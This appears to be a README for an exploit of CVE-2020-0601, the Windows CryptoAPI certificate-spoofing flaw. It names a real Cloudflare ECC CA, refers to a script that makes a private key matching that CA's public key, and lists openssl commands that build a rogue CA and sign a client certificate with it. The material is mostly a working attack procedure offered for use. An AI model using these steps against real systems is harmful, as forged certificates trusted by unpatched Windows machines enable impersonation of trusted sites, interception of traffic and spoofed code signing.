# CryptoAPI

CVE-2020-0601: Windows CryptoAPI Spoofing Vulnerability exploitation

# CA certificate

We used the [CloudFlare Inc ECC CA-2](https://ssl-tools.net/subjects/2b0413693df1d33d7e89cba055cf204f9c158c9d)

An example of usage of this certificate is :
```bash
openssl s_client -connect tonerrefillkits.com:443 -showcerts
```

To generate a private key which match the public key certificate we used the script **gen-key.py**. Then to generate the rogue CA:

```bash
$ openssl x509 -signkey p256-key-rogue.pem -in rogue.csr -req -days 365 -out CA-rogue.crt
```

The we generate the following private key and certificate:
```bash
openssl ecparam -name prime256v1 -genkey -noout -out prime256v1-privkey.pem

openssl req -key prime256v1-privkey.pem -new -out prime256v1.csr

openssl x509 -req -in prime256v1.csr -CA CA-rogue.crt -CAkey p256-key-rogue.pem -CAcreateserial -out client-cert.pem -days 500 -sha256
```